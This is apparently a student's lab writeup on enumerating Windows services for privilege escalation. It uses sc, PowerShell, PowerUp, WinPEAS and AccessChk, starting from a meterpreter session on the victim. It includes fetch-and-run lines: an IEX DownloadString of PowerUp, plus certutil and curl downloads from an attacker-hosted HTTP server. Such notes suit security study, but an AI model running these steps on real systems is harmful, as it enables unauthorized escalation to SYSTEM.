<h1 align="center"> Windows Services </h1>



## Scope







## Table of Contents






---




# Introduction to Windows Services

## What are Windows Services?
**Windows Services** are long-running executable applications that run in the background on Windows systems, typically without user interaction. They are managed by the Service Control Manager (SCM) and can start automatically at boot or be started manually.


### Basic concept
````
Windows Services = Background programs that run without user interaction
                  Start automatically with Windows
                  Run with specific permissions (often as SYSTEM)
````

### They are managed with the **Services Control Manager Panel**:
On windows first press `Ctrl + S` -> Type `Services`:
<img width="783" height="683" alt="image" src="https://github.com/user-attachments/assets/33618d19-0b1f-4a50-9db3-6fa61f2c51d1" />

<img width="1915" height="889" alt="image" src="https://github.com/user-attachments/assets/350dca67-105c-45db-a1f1-66c23f85cbc1" />

There exists different `Type` of services:
- Local Services
- Network Services
- System Services
- third party application services.



### Common Use Cases
- System Maintenance: Managing updates, backups, and diagnostics.
- Security: Antivirus engines, firewalls, and credential managers.
- Networking: DHCP, DNS, and remote access services.
- Application Support: Database engines (e.g., SQL Server), web servers (e.g., IIS), and monitoring tools.


## Why Are Windows Services Important for Privilege Escalation?
Attackers exploit misconfigurations in Windows Services to gain higher privileges (often SYSTEM) by:
- Modifying service configurations (if permissions allow).
- Replacing service binaries with malicious ones.
- Creating new services that execute arbitrary code.
- Abusing weak service permissions (e.g., SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG).

> If a service runs as SYSTEM and we can modify its binary or command line, we can get a shell with SYSTEM privileges - the highest level on Windows.



---






# Windows Services Methodology
In this after i get target `meterpreter`, first i need to get victim shell: 

<img width="1038" height="474" alt="image" src="https://github.com/user-attachments/assets/feb8b573-5350-43ed-b4c7-8176b7426f01" />

<img width="1020" height="389" alt="image" src="https://github.com/user-attachments/assets/c7369b04-4fdf-4d63-8977-8c005120916a" />

- After in this we wait target execute our file payload.
<img width="1899" height="657" alt="image" src="https://github.com/user-attachments/assets/fcb7b473-2895-4fae-a719-07ea54660efc" />

- Now we got success to get target shell.

---

In this we we not yet to get taget shell go to this:
[Target Shell by msfconsole](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/02.%20Initial%20Access%20(Shells).md)

---




## 1. View and Managing Services

### 1. USING COMMAND PROMPT (CMD)

#### List all service
##### List all services with details
````
sc query
````
<img width="924" height="800" alt="image" src="https://github.com/user-attachments/assets/f91cf59f-1ab8-4346-aecc-00ca70fb45d4" />

- Lists all Windows services and their current status.

````
sc queryex
````
<img width="801" height="777" alt="image" src="https://github.com/user-attachments/assets/e7eb9069-3345-4d3f-9414-26ab72c4c08c" />

- Shows detailed information about a specific Windows service


````
sc queryex Appinfo
````
<img width="783" height="276" alt="image" src="https://github.com/user-attachments/assets/67691b6e-5f82-4114-b1d6-353cef8158ce" />

- `Appinfo`: is Service name.



##### List all service running 
````
sc query state=all
````
<img width="801" height="792" alt="image" src="https://github.com/user-attachments/assets/995c4459-2fca-446c-8e03-1174d4a43b71" />



##### List specific service
````
sc query "WpnUserService_625cf"
````
<img width="794" height="242" alt="image" src="https://github.com/user-attachments/assets/76f3dc8f-c5ab-41fa-97bc-63eaa46a55d5" />


##### Query service details
````
sc qc "WwanSvc"
````
<img width="995" height="335" alt="image" src="https://github.com/user-attachments/assets/52d99495-b474-45a1-a58e-3aa646920ce0" />

- Now we see the specific name service.



#### Service Control Commands
##### Start a service
````
sc start "AJRouter"
````
<img width="828" height="296" alt="image" src="https://github.com/user-attachments/assets/ed36e4a0-fc7d-4db1-b159-29d866dbf5c1" />

- Now we was start the service, after we use this command again:
<img width="572" height="150" alt="image" src="https://github.com/user-attachments/assets/292ac0ac-a54d-46c7-bc48-1c378fe74ee7" />

- Now we see `An instance of the service is already running.`


##### Stop a service  
````
sc stop "AJRouter"
````
<img width="815" height="390" alt="image" src="https://github.com/user-attachments/assets/ff10518b-36e9-4dbf-a1b1-ec891d0195fe" />

- Now we was stop this service.


##### Delete a service
````
sc delete "service_name"
````
- `sc delete`: is used to unregister and remove a service completely from Windows. But in this i don't want to delete any service.



##### Get service configuration
````
sc qc "spooler"
````
<img width="692" height="317" alt="image" src="https://github.com/user-attachments/assets/739f0b0f-e15a-48d2-9c82-1c6994baa190" />


Our output shows the Print Spooler service runs automatically at boot, depends on RPC/HTTP, and executes as LocalSystem with high privileges — making it both essential for printing and a common target in privilege escalation labs.

---



### 2. Using PowerShell
- In this after we got the victim `meterpreter`, after i want to get victim `Powershell`:
````
load powershell
powershell_shell
````
<img width="451" height="148" alt="image" src="https://github.com/user-attachments/assets/c3715360-d6ad-4e1e-9722-fccf6201f536" />

- Now we got the victim `Powershell`.



#### PowerShell Service Commands

##### List all services
````
Get-Service
````
<img width="735" height="803" alt="image" src="https://github.com/user-attachments/assets/38ccd5b1-a13f-4ac9-9c06-224a1fb72754" />

- `Get-Service`: is the **PowerShell equivalen**t of `sc query`, used for **enumerating and controlling services** in a more scriptable way.



##### List running services
````
Get-Service | Where-Object {$_.Status -eq "Running"}
````
<img width="720" height="817" alt="image" src="https://github.com/user-attachments/assets/ce061a9a-cc45-4de1-a4d8-e7fad46ec70e" />

- This show all services that `running`.
- `Get-Service | Where-Object {$_.Status -eq "Running"}` is use for lists all Windows services that are currently running. It gets all services with Get-Service and filters them to show only those whose status is `Running`, This helps quickly see which services are active on your system.



##### List stopped services  
````
Get-Service | Where-Object {$_.Status -eq "Stopped"}
````
<img width="707" height="784" alt="image" src="https://github.com/user-attachments/assets/19a3281f-977b-4b75-a372-46c23a41835b" />

- It shows all Windows services that are currently `stopped`.
- `Get-Service`: Lists all services on the system.
- `| (pipe)`: sends that list to the next command.
- `Where-Object {$_.Status -eq "Stopped"}`: filters the list, keeping only services whose Status equals "Stopped".





##### Get specific service
````
Get-Service -Name "spooler"
````
<img width="486" height="147" alt="image" src="https://github.com/user-attachments/assets/5319a4f6-4a8b-436d-9df5-b9b5ddf422d5" />

- Now we see `Spooler` is running.
- `Get-Service`: retrieves information about Windows services.
- `-Name "spooler"`: limits the result to the service named Spooler (the Print Spooler, which manages print jobs).
-  It shows the status and details of the Print Spooler service (e.g., `whether it’s Running`, `Stopped`, `its display name`, etc.).



##### Start service
````
Start-Service -Name "spooler"
````
<img width="410" height="61" alt="image" src="https://github.com/user-attachments/assets/bc3a4c25-f504-4241-bddf-8176bbb4badd" />

- Now it start the service `spooler`.
- If we want to check this status just use this command `Get-Service -Name "spooler"`:
<img width="538" height="158" alt="image" src="https://github.com/user-attachments/assets/baf228f7-edb2-42dd-ada2-0ce8cdc8a615" />

- Now we see this service `spooler` is running.




##### Stop service
````
Stop-Service -Name "spooler"
````
<img width="386" height="61" alt="image" src="https://github.com/user-attachments/assets/ead6da39-4d99-4cb6-82eb-3275554a3c76" />

- If we want to check this status just use this command `Get-Service -Name "spooler"`:
<img width="472" height="311" alt="image" src="https://github.com/user-attachments/assets/c92f4a61-9a61-40d2-bfa5-e41565ede0e3" />


##### Restart service
````
Restart-Service -Name "spooler"
````
<img width="466" height="162" alt="image" src="https://github.com/user-attachments/assets/6ff858b5-2084-40e1-ba80-97ddea956992" />

Now we see this service is restart to `running` 

##### Get service details with WMI
````
Get-WmiObject Win32_Service | Where-Object {$_.Name -eq "spooler"}
````
<img width="772" height="229" alt="image" src="https://github.com/user-attachments/assets/643fd6a7-9d8f-41dd-b4d6-17ec3cf8e388" />


- Our Print Spooler service is running fine, auto-starts with Windows, and has no errors.
- `ExitCode : 0` → No errors when starting the service.
- `Name : Spooler` → Internal service name.
- `ProcessId : 4448` → The PID of the running spooler process.
- `StartMode : Auto` → It’s set to start automatically with Windows.
- `State : Running` → The service is currently active.
- `Status : OK` → Health check shows it’s functioning properly.


- If we want to see just the state without all the extra properties, we can run:
````
(Get-WmiObject Win32_Service -Filter "Name='spooler'").State
````
<img width="762" height="117" alt="image" src="https://github.com/user-attachments/assets/f0c7fd3f-8099-4254-927e-b9de87842fec" />



#### Get service Details
##### Get service with full details
````
Get-CimInstance Win32_Service -Filter "Name='spooler'" | Select-Object *
````
<img width="1214" height="715" alt="image" src="https://github.com/user-attachments/assets/fe882f6b-e375-4292-ad46-3a1c8889d6ed" />

- `Get-CimInstance Win32_Service`: Retrieves information about Windows services using CIM (Common Information Model).
- `-Filter "Name='spooler'"`: Limits the query to only the service whose name is spooler (this is the Print Spooler service).
- `| Select-Object *`: Pipes the result to Select-Object *, which displays all available properties of that service object.

- This command shows detailed information about the Print Spooler service on your Windows system. The Print Spooler manages print jobs — it queues documents and sends them to printers.


##### Or using Get-Service with format
````
Get-Service -Name "spooler" | Format-List *
````
<img width="690" height="427" alt="image" src="https://github.com/user-attachments/assets/b98e3459-f709-45b1-85c4-79c2abe0e87b" />

- `Get-Service -Name "spooler"`: Retrieves the Print Spooler service object from Windows.
- `| Format-List *`: Pipes the result into Format-List *, which displays all properties of the service in a list format (instead of a table).

- This command gives you a full detailed view of the Print Spooler service, but only the properties that PowerShell’s `Get-Service` exposes (not the deeper CIM/WMI properties).


> Note: spooler is the name of service.



##### Display specific properties for each service
````
Get-Service | Select-Object DisplayName, Status, ServiceName, Can*
````
<img width="780" height="815" alt="image" src="https://github.com/user-attachments/assets/7274729b-f317-4af2-99d2-04da8efe5d75" />

Shows only selected details:
  - `DisplayName`: Friendly name of the service
  - `Status`: Running or Stopped
  - `ServiceName`: Internal name
  - `Can*`: Properties like CanStop, CanPause, etc.




---


### 3. Using GUI (Services.msc)

#### Open Services GUI

##### Open Services manager
````
services.msc
````
<img width="267" height="70" alt="image" src="https://github.com/user-attachments/assets/f0709360-9eeb-4905-87f4-a33d82bb5efe" />

- If we type this command on kali (attacker) it will show in target (Windows). After looking on windows:
<img width="1918" height="882" alt="image" src="https://github.com/user-attachments/assets/1e25378e-16c8-4fe6-a9d0-3950f32c6453" />

- IT will auto show to this auto.
- It’s a **Microsoft Management Console (MMC)** snap-in that opens the **Services management window** in Windows.
- OR in windows we can launch it by pressing `Win + R`, typing `services.msc`, and hitting `Enter`.

- What we will See:
The Services window gives you a graphical interface to:
  - View all installed Windows services
  - Check their **status** (Running, Stopped, Paused)
  - Configure their startup type (Automatic, Manual, Disabled)
  - Start, stop, pause, or restart services
  - Read descriptions of what each service does.
 
---




## 2. Understanding Service Properties

### 1. SERVICE ACCOUNT

#### Common Service Accounts:

##### Built-in accounts:
| Account Type | Account Name        | Description                                      |
| ------------ | ------------------- | ------------------------------------------------ |
| Built-in     | LocalSystem         | Highest privilege account on the system (SYSTEM) |
| Built-in     | LocalService        | Limited local privileges                         |
| Built-in     | NetworkService      | Limited privileges with network access           |
| Built-in     | NT AUTHORITY\SYSTEM | Same as LocalSystem (SYSTEM)                     |
| Custom       | Domain\User         | Domain user account                              |
| Custom       | Computer\User       | Local user account                               |


#### Check Service Account:

##### Using sc

- First in this we need to check service first:
````
sc qc "spooler" | findstr "SERVICE_START_NAME"
````
<img width="679" height="96" alt="image" src="https://github.com/user-attachments/assets/c19ea342-9855-403b-96cd-9f5a3b55ca7e" />

> Note: This we use in CMD if we use on powershell it not work.


##### Using PowerShell
````
Get-WmiObject Win32_Service -Filter "Name='spooler'" | Select-Object StartName
````
<img width="912" height="147" alt="image" src="https://github.com/user-attachments/assets/44507f52-abef-419c-888c-6fa453553811" />
 
- `spooler`: is the name of service.
- `Get-WmiObject Win32_Service`: Queries WMI for service objects and their properties.
- `-Filter "Name='servicename'"`: Limits the query to the service with the exact internal Name (replace servicename with the real one, e.g., spooler).
-  `Select-Object StartName`: Outputs only the StartName property, which is the account the service is configured to run under

> Note: This command we use with powershell.


Or we can use it any command:
- Find the exact service name:
````
Get-Service | Select-Object Name, DisplayName, Status
````
<img width="889" height="813" alt="image" src="https://github.com/user-attachments/assets/6a92ab2a-58a1-4297-a2a4-65ceef25db30" />


---



### 2. STARTUP TYPE


#### Startup Types:
| Value | Startup Type | Description                                |
| ----: | ------------ | ------------------------------------------ |
|     0 | Boot         | Driver loaded during system boot           |
|     1 | System       | Driver loaded during system initialization |
|     2 | Auto Start   | Service starts automatically with Windows  |
|     3 | Manual       | Service must be started manually           |
|     4 | Disabled     | Service is disabled and cannot be started  |



#### Check Startup Type:
````
sc qc "spooler" | findstr "START_TYPE"
````
<img width="570" height="96" alt="image" src="https://github.com/user-attachments/assets/04aa700b-9702-4812-be1e-fc9564aff4f3" />

- `sc qc "spooler"`
  - `sc` = Service Control command-line tool.
  - `qc` = query configuration → shows the configuration details of the service.
  - `"spooler"` = the internal name of the Print Spooler service.
- `| findstr "START_TYPE"`
  - Pipes the output to `findstr`, which searches for the text `"START_TYPE"`.
  - This filters the configuration output so you only see the startup type line



- Or PowerShell
````
(Get-WmiObject Win32_Service -Filter "Name='spooler'").StartMode
````
<img width="718" height="90" alt="image" src="https://github.com/user-attachments/assets/675d8975-95ca-43f9-85bb-ba2da2b85899" />


- The command looks at a Windows service called `spooler`. It shows the StartMode, which means how that service starts when Windows boots.

- The result will show: 
| Startup Type | Description                              |
| ------------ | ---------------------------------------- |
| Auto         | Starts automatically when Windows starts |
| Manual       | Starts only when needed                  |
| Disabled     | Won’t start at all until enabled         |


---



#### Binary Path

##### Most Important Property!
This is what gets executed `BINARY_PATH_NAME: C:\Program Files\Vulnerable Service\service.exe`.


##### Check Binary Path:
````
sc qc "spooler" | findstr "BINARY_PATH_NAME"
````
<img width="657" height="87" alt="image" src="https://github.com/user-attachments/assets/f295caff-98d3-4ccd-a895-36b77101e3fd" />

- `spooler`: the internal service name for Print Spooler.
- `BINARY_PATH_NAME`: shows the actual program file that runs the service.
- In this case, it’s `spoolsv.exe` located in `C:\Windows\System32`.


- Or PowerShell
````
(Get-WmiObject Win32_Service -Filter "Name='spooler'").PathName
````
<img width="726" height="93" alt="image" src="https://github.com/user-attachments/assets/03f7d6c9-7bb9-415d-9e96-e80f58f2c975" />

- `Get-WmiObject Win32_Service`: Looks up information about Windows services using WMI (Windows Management Instrumentation).
- `-Filter "Name='spooler'"`: Narrows it down to only the service whose internal name is spooler (that’s the Print Spooler service, which manages printing).
- `.PathName`: Selects the PathName property of that service.
This property shows the full file path of the executable program that runs the service.


---


## 3. FINDING VULNERABLE SERVICES 

### 1. Manual Enumeration

#### List All Services with Details

##### PowerShell one-liner to list all services with details
````
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, StartName, PathName | Format-Table -AutoSize
````
<img width="1340" height="781" alt="image" src="https://github.com/user-attachments/assets/b851c3fc-532e-4dc1-b8d8-a592563c0728" />

- `Get-WmiObject Win32_Service`: Retrieves information about all Windows services using WMI (Windows Management Instrumentation).

- `Select-Object Name, DisplayName, State, StartMode, StartName, PathName`: Chooses specific properties to display for each service:
  - `Name`: Internal service name (e.g., `spooler`)
  - `DisplayName`: Friendly name (e.g., Print Spooler)
  - `State`: Current status (Running, Stopped, Paused)
  - `StartMode`: How the service starts (Auto, Manual, Disabled)
  - `StartName`: The account under which the service runs (e.g., LocalSystem)
  - `PathName`: The executable file path that runs the service

- `Format-Table -AutoSize`: Displays the results in a nice table format, automatically adjusting column widths so everything fits neatly.


##### Save to file for analysis
````
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, StartName, PathName | Export-Csv -Path services.csv -NoTypeInformation
````
<img width="1610" height="79" alt="image" src="https://github.com/user-attachments/assets/e93d0f42-02c1-47b7-897c-6f10775afaee" />

- We don’t see anything because the command exports the **results into a file** instead of showing them on screen.
To view the results, open `services.csv` in Excel, Notepad, or use `Get-Content` in PowerShell.


###### Check file:
- See where we are
````
Get-Location
````
<img width="1610" height="206" alt="image" src="https://github.com/user-attachments/assets/2ac0b3b7-69fc-41dc-b5a9-feeaf10d0c94" />


- List files in the folder
````
Get-ChildItem
````
<img width="732" height="707" alt="image" src="https://github.com/user-attachments/assets/dfd92cc9-0c8e-4acc-a0d7-c7094bf08469" />




- Open the file in powershell:
````
Get-Content services.csv
````
<img width="1905" height="814" alt="image" src="https://github.com/user-attachments/assets/caf0d22c-0bb2-482f-88f7-9b851cb8c0e3" />

- If in the victim we can open file on `Notepad`:
````
notepad services.csv
````
<img width="1109" height="805" alt="image" src="https://github.com/user-attachments/assets/6f75a95c-c2b6-43f4-8b2e-90949e84650b" />





#### Find Services Running as SYSTEM

##### Services running as SYSTEM (most privileged)
````
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, DisplayName, PathName
````
<img width="1275" height="811" alt="image" src="https://github.com/user-attachments/assets/0176c7a6-8c88-4b51-a901-b8b9f65d4f6b" />

- This command use for lists all Windows services that run under the LocalSystem account (a powerful built‑in system account), and shows their internal name, friendly name, and the executable file path they use.

- Also tells you which services are running with full system privileges and what program files they use.

##### Alternative
````
sc query | findstr "SERVICE_NAME" > services.txt
````
<img width="743" height="110" alt="image" src="https://github.com/user-attachments/assets/1cfcf6b1-7d4a-44f2-a627-e091aab5ee6c" />

- Now we can input the `Service_name` on our file `Services.txt`
````
dir services.txt
````
<img width="572" height="231" alt="image" src="https://github.com/user-attachments/assets/17b64cce-05e1-4fbf-9ed4-93fd1e34854a" />


- View the content:
````
type services.txt
````
<img width="535" height="773" alt="image" src="https://github.com/user-attachments/assets/546d4a49-1cd4-47f4-9fa6-44bed2a7e670" />

- Now I see all `Name_service`.

- Or if we on direct Windows and want to see it in `notepad`:
````
notepad services.txt
````
<img width="1021" height="828" alt="image" src="https://github.com/user-attachments/assets/1373b564-48de-45c9-8a8c-127af5ec9ddc" />

- Now we see all `Name_service` on my `Notepad`.


````
For /F "tokens=2 delims=:" %i in (services.txt) do @sc qc %i | findstr /i "localsystem"
````
<img width="1110" height="776" alt="image" src="https://github.com/user-attachments/assets/7b631878-b57a-4231-9e07-f451bdea279f" />

- `For /F ... in (services.txt)`: Reads each line from the file services.txt.

- `tokens=2 delims=:` Splits each line at the : character and takes the second part (the service name).

- `%i`: Holds that service name for use in the loop.

- `sc qc %i`: Runs the sc qc command, which shows the configuration details of the service %i.

- `| findstr /i "localsystem"`: Filters the output to only show lines containing `"LocalSystem"` (case-insensitive). This checks if the service runs under the LocalSystem account.

- This command goes through a list of services in `services.txt`, checks their configuration, and shows only the ones that are running under the LocalSystem account.



#### Find services with writeable Paths
##### Check if you can write to service binary locations
In this I use with direct on windows on `Powershell`:
````
notepad Check_ServicesPaths.ps1
````
````
$services = Get-WmiObject Win32_Service
foreach ($service in $services) {
    $path = $service.PathName
    if ($path -and $path -notmatch '^\"') {
        # Extract directory from path
        $dir = Split-Path $path -Parent
        if (Test-Path $dir) {
            # Check write permissions
            $acl = Get-Acl $dir
            $access = $acl.Access | Where-Object { $_.IdentityReference -eq $env:USERNAME }
            if ($access) {
                Write-Host "Service: $($service.Name) - Path: $dir"
            }
        }
    }
}
````
<img width="883" height="528" alt="image" src="https://github.com/user-attachments/assets/08a8dc94-1fd6-4e8e-b48c-d452c9a91f5d" />

<img width="1107" height="833" alt="image" src="https://github.com/user-attachments/assets/a8fe67db-ab03-4adf-bede-4eb4dc464696" />

- To save it press `Ctrl + S`.
<img width="906" height="253" alt="image" src="https://github.com/user-attachments/assets/e82f60a8-1f5f-4a03-9536-5051b77e1aee" />

- After I close it and open it again with `Run as Administrator`:
````
cd C:/Users/k40ng
ls
````
<img width="947" height="888" alt="image" src="https://github.com/user-attachments/assets/e17c97d4-1bba-49dc-9b89-82637964371e" />

````
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
Get-ExecutionPolicy -List
````
<img width="1807" height="392" alt="image" src="https://github.com/user-attachments/assets/7c0f4ae4-7cea-45b8-8b37-c71280f75273" />

- Now we see `CurrentUser    RemoteSigned`.


- After Run script  
````
.\Check_ServicesPaths.ps1
````
<img width="555" height="85" alt="image" src="https://github.com/user-attachments/assets/65411090-cb24-4e6c-8596-0ad036416372" />


````
Write-Host "Script finished running"
````
<img width="669" height="155" alt="image" src="https://github.com/user-attachments/assets/52c1b618-eb41-4670-ae83-80dbc7e4bd42" />

##### Why we don't see any output:
- In this we don’t see any output because the script is designed to **only print services where your current user account has write permissions to the service’s binary folder**.
- On most Windows systems, normal users do not have write access to service executable directories (like `C:\Windows\System32` or `C:\Program Files`). That’s why the script runs fine but produces no results — there simply aren’t any matches for your account.

- Check one directory manual:
````
$dir = "C:\Windows\System32"
Get-Acl $dir | Format-List
````
<img width="1882" height="647" alt="image" src="https://github.com/user-attachments/assets/0a049ae3-29b8-48c8-ac9b-03d08128d249" />

- **Path** `Microsoft.PowerShell.Core\FileSystem::C:\Windows\System32`: This is the folder we checked permissions for.

- **Owner / Group** `NT SERVICE\TrustedInstaller`: The TrustedInstaller service owns this folder. That’s why even Administrators can’t freely modify files here without taking ownership first.

- **Access entries** Each line shows who has what rights:
  - **CREATOR OWNER**: placeholder for whoever creates files inside.
  - **NT AUTHORITY\SYSTEM** the system account has full control and modify rights.
  - **BUILTIN\Administrators**: administrators have modify rights, but not ownership.
  - **BUILTIN\Users**: normal users only have Read & Execute (they can run programs but not change them).
  - **TrustedInstaller**: has Full Control.
  - **APPLICATION PACKAGE AUTHORITY**: permissions for modern apps (UWP), usually read/execute only.

- **Audit**: Empty here — would show auditing rules if configured.

- **Sddl**: The raw Security Descriptor Definition Language

---




### 2. Using Powerup.ps1 (Automated)

#### Check execution policy:
````
Get-ExecutionPolicy -List
````
<img width="378" height="210" alt="image" src="https://github.com/user-attachments/assets/591ba878-c6e3-4d8a-9b88-d1a4d1a59553" />


#### Download and load PowerUp.ps1
Load directly from GitHub into memory (no file saved):
````
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
````
<img width="1441" height="66" alt="image" src="https://github.com/user-attachments/assets/80253961-36cc-4541-a403-8b23fa7fe822" />

- IEX loads the script into our current session.


#### Run all Check
````
Invoke-AllChecks
````
<img width="1446" height="816" alt="image" src="https://github.com/user-attachments/assets/bffc65b9-dff5-4380-b667-fd5bcb325973" />

- This enumerates services, file permissions, registry keys, and common misconfigurations.
- Expect a lot of output—scroll and read findings carefully.

##### What the results mean
Each line is a finding category. PowerUp lists checks where it found something noteworthy:

- **User Has Local Admin Privileges**: Confirms whether your current account is an administrator.

- **User In Local Group with Admin Privileges**: Shows if you’re part of a group that grants admin rights.

- **Process Token Privileges (repeated)**: Lists special privileges your current process token has (like `SeDebugPrivilege`, `SeImpersonatePrivilege`). These can sometimes be abused for escalation.

- **Modifiable Service Files (repeated many times)**: This is the big one: PowerUp found multiple service binaries or related files that your account can modify.
  - If we can write to a service’s executable or DLL, we could replace it with something else.
  - When the service runs (often as SYSTEM), our code would run with elevated privileges.
  - That’s why PowerUp flags them — they’re potential privilege escalation paths.


#### Run specific check:

- To run all of this we need to run this command first `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')`, if we don't run this command first it not work:

<img width="1292" height="389" alt="image" src="https://github.com/user-attachments/assets/ee010cb7-b069-4bd5-a55e-a85f644f3006" />

- IF we run first.

##### Find services with modifiable binaries
````
Get-ModifiableServiceFile
````
<img width="1454" height="788" alt="image" src="https://github.com/user-attachments/assets/1da8ab30-f840-4e72-babc-1f2ea9160b4b" />


##### Find services you can modify
````
Get-ModifiableService
````
<img width="901" height="773" alt="image" src="https://github.com/user-attachments/assets/8e03d6c3-cb40-469f-8d11-1782aa5ceb39" />


##### Find services where you can change binpath
````
Get-ModifiableService | Where-Object {$_.CanRestart -eq $true}
````
<img width="893" height="770" alt="image" src="https://github.com/user-attachments/assets/db64a4ef-d478-4a4c-a536-5d81336f86df" />

---



### 3. USING WINPEAS

#### Download WinPEAS:
- Go to this source: https://github.com/carlospolop/PEASS-ng
<img width="1918" height="1022" alt="image" src="https://github.com/user-attachments/assets/4f9c0a42-25e4-448a-b882-4648f0def4ca" />

- In this first I want to create one folder:
````
mkdir ~/winpeas && cd ~/winpeas
````
<img width="359" height="126" alt="image" src="https://github.com/user-attachments/assets/01d6f71b-2297-4495-819c-f6206a0e6806" />


- Download direct the lates windPEAS executable
````
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
````
<img width="1915" height="654" alt="image" src="https://github.com/user-attachments/assets/43b73f3a-8577-4ab4-a9c2-b058266edc85" />

- Now we was download the winpeas file.


- Verify
````
ls -l winPEASany.exe
````
<img width="624" height="76" alt="image" src="https://github.com/user-attachments/assets/24545f3c-2c25-4cd2-8af3-b277a1ef5cbb" />

- Now we see our file.


##### After I host a ssimple HTTP Server on kali:
- Start an HTTP server in the same directory:
````
python3 -m http.server 8080
````
<img width="594" height="118" alt="image" src="https://github.com/user-attachments/assets/205054fd-d151-4ede-b5c3-8160293a61ac" />


- After back to our windows.


##### On Windows:
````
certutil -urlcache -f http://192.168.127.128:8080/winPEASany.exe winpeas.exe
````
<img width="917" height="109" alt="image" src="https://github.com/user-attachments/assets/b8b9b60d-dd00-4a13-8fb2-a4bbeffd8d6d" />

- Now we successfully to download.


##### Run Winpeas
````
winpeas.exe
````
<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/ad1720d0-4b94-4200-bc72-3b5db668f2dd" />

<img width="1338" height="577" alt="image" src="https://github.com/user-attachments/assets/46ef8e23-9dc8-4b78-b97e-d5ea0cb7eaa8" />

<img width="1708" height="715" alt="image" src="https://github.com/user-attachments/assets/def91dd7-ff25-4f4a-b800-7af80ad0ffe3" />

<img width="1557" height="719" alt="image" src="https://github.com/user-attachments/assets/ff34c395-232b-476d-a438-b55051e02c80" />

<img width="1708" height="761" alt="image" src="https://github.com/user-attachments/assets/b3160842-ab0d-4bcf-aff5-864fe8e0636f" />

<img width="1390" height="739" alt="image" src="https://github.com/user-attachments/assets/eeda5c18-2bf8-49e8-9f45-ea78a081e388" />

<img width="1728" height="703" alt="image" src="https://github.com/user-attachments/assets/2284427e-948f-46b6-83b3-5d6bd1dcb401" />

<img width="997" height="691" alt="image" src="https://github.com/user-attachments/assets/761135f3-99e6-4917-a1e1-af064c1a043a" />

<img width="1742" height="788" alt="image" src="https://github.com/user-attachments/assets/1c9a1933-b08e-49e0-9943-b0f64a39bd6c" />

<img width="775" height="260" alt="image" src="https://github.com/user-attachments/assets/0bbb3658-ff08-4df4-af0b-f6c1b0e44c57" />

- Now we can view all target infomation.

- WinPEAS checks:
  - Services with weak permissions
  - Unquoted service paths
  - Services running as SYSTEM
  - Services you can start/stop.


---




## 4. SERVICE-RELATED PRIVILEGE ESCALATION 


### 1. Weak Service Permissions

#### Understanding Service Permissions
Each service has a Security Descriptor (SD) that controls:

| Security Descriptor (SD) Controls | Description                                         |
| --------------------------------- | --------------------------------------------------- |
| Start / Stop Service              | Defines who is allowed to start or stop the service |
| Change Configuration              | Defines who can modify the service configuration    |
| Query Status                      | Defines who can view the service status             |

Or in a concise bullet-style table for notes:
| Permission                   | Purpose                                   |
| ---------------------------- | ----------------------------------------- |
| SERVICE_START / SERVICE_STOP | Control starting and stopping the service |
| SERVICE_CHANGE_CONFIG        | Control service configuration changes     |
| SERVICE_QUERY_STATUS         | Allow querying the service status         |


#### Check Service Permissions with **AccessChk**

##### Download **AccessChk**
- In this first I download from KALI (Attacker) first:
````
wget https://download.sysinternals.com/files/AccessChk.zip
unzip AccessChk.zip -d accesschk
````
<img width="1869" height="440" alt="image" src="https://github.com/user-attachments/assets/6869f70e-190a-4488-8e5e-194ede961b35" />


##### Transfer to target:
- On kali:
````
cd ~/accesschk
python3 -m http.server 5555
````
<img width="655" height="256" alt="image" src="https://github.com/user-attachments/assets/a0d9952c-c6bc-4241-ac33-ead3cd37264e" />


- On target:
````
curl http://192.168.127.128:5555/accesschk64.exe -o accesschk64.exe
dir accesschk64.exe
````
<img width="755" height="327" alt="image" src="https://github.com/user-attachments/assets/1e7720c3-f167-4168-9345-cbc60c879191" />



#### Run AccessChk on Windows

##### Check a single service
````
accesschk64.exe -qc spooler
````
<img width="757" height="243" alt="image" src="https://github.com/user-attachments/assets/a274b483-14b7-449d-b043-600e7657b135" />

- `-q`: quiet mode (less clutter).
- `-c`: tells AccessChk you’re checking a service.
- `spooler`: the service name.
- This will show who can query, start, stop, or modify the Spooler service.

- **R  NT AUTHORITY\Authenticated Users**
  - `R` = `Read` access.
  - Any authenticated user can query basic info about the service (like status).
  - This is normal and not a security risk.
- **RW BUILTIN\Administrators**
  - `RW` = `Read/Write` access.
  - Administrators can change the service configuration (start type, binary path, etc.).
  - Expected — admins should have this level of control.
- **RW NT AUTHORITY\SYSTEM**
  - The SYSTEM account also has full read/write control.
  - Again, expected — SYSTEM runs most core services.



##### Check all services
````
accesschk64.exe -uwcqv *
````
<img width="729" height="798" alt="image" src="https://github.com/user-attachments/assets/ddb356a3-a45e-4073-ad27-83cc483e6c79" />

- `-u`: show only permissions for the current user.
- `-w`: show write permissions.
- `-c`: check services.
- `-q`: quiet mode.
- `-v`: verbose output.
- `*`: all services.
- This lists every service and whether your account can modify them.


##### Download AccessChk from Sysinternals
````
accesschk64.exe /accepteula -qc "spooler"
````
<img width="772" height="257" alt="image" src="https://github.com/user-attachments/assets/8dad72e3-b866-4ba5-81ad-7de12c93eb53" />


##### Check if current user can modify any service
````
accesschk64.exe /accepteula -uwcqv * | findstr /i "SERVICE_ALL_ACCESS"
````
<img width="974" height="695" alt="image" src="https://github.com/user-attachments/assets/4cd67c8d-85f1-4a98-a419-a986cbb0f40a" />

- Now we got successful to download this tools.

---








































